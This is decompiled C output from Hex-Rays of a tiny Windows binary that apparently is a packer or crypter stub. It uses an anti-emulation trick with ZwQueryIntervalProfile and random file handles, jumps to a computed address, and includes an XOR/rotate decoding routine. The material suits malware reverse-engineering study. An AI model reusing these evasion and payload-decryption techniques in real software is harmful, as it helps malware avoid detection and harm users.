/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int start();
_DWORD *__stdcall sub_4011D2(_DWORD *, unsigned int, int);

//-------------------------------------------------------------------------
// Data declarations

char byte_40110B[] = { '\x90' }; // weak
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern DWORD (__stdcall *GetCurrentProcessId)();


//----- (00401006) --------------------------------------------------------
int start()
{
  LPSTR v0; // eax
  int v2; // [esp+0h] [ebp-2Ch]
  HMODULE hModule; // [esp+4h] [ebp-28h]
  HANDLE v4; // [esp+8h] [ebp-24h]
  int v5; // [esp+Ch] [ebp-20h]
  int v6; // [esp+10h] [ebp-1Ch]
  HANDLE v7; // [esp+14h] [ebp-18h]
  HRSRC hResInfo; // [esp+18h] [ebp-14h]
  HANDLE FileA; // [esp+1Ch] [ebp-10h]
  int v10; // [esp+24h] [ebp-8h]
  int v11; // [esp+24h] [ebp-8h]
  LPSTR CommandLineA; // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h]

  FileA = CreateFileA("lgB.tI9", 0x40000000u, 5u, 0, 3u, 0x1A6u, 0);
  v4 = CreateFileA("FdZQqJpJzJNn0dSsOnkY3A.dH2", 0x80000000, 1u, 0, 3u, 0x181u, 0);
  hModule = GetModuleHandleA("NTDLL.DLL");
  v7 = CreateFileA("TfL4IDS551IzyH6clLX5ewtbtSS.28j", 0xA0000000, 3u, 0, 3u, 0x121u, 0);
  GetCurrentThreadId();
  CommandLineA = GetCommandLineA();
  hResInfo = (HRSRC)GetProcAddress(hModule, "ZwQueryIntervalProfile");
  GetCurrentProcessId();
  GetCurrentThreadId();
  SizeofResource(0, hResInfo);
  v0 = GetCommandLineA();
  v11 = ((int (__stdcall *)(_DWORD, _DWORD, int, HMODULE, HANDLE, int, int, HANDLE, HRSRC, HANDLE, LPSTR, int, LPSTR, int))hResInfo)(
          0,
          0,
          v2,
          hModule,
          v4,
          v5,
          v6,
          v7,
          hResInfo,
          FileA,
          v0,
          v10,
          CommandLineA,
          savedregs);
  return ((int (*)(void))&byte_40110B[v11 ^ 0xC0000005])();
}
// 4010EB: variable 'v2' is possibly undefined
// 4010EB: variable 'v5' is possibly undefined
// 4010EB: variable 'v6' is possibly undefined
// 4010EB: variable 'v10' is possibly undefined
// 4010EB: variable 'savedregs' is possibly undefined

//----- (004011D2) --------------------------------------------------------
_DWORD *__stdcall sub_4011D2(_DWORD *a1, unsigned int a2, int a3)
{
  _DWORD *result; // eax
  unsigned int v4; // ecx

  result = a1;
  v4 = a2 >> 2;
  do
  {
    *result ^= a3;
    *result += 1722648083;
    *result ^= a3;
    *result = -*result;
    *result -= a3;
    *result ^= a3;
    *result = __ROR4__(*result, 183);
    *result++ ^= a3;
    --v4;
  }
  while ( v4 );
  return result;
}

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
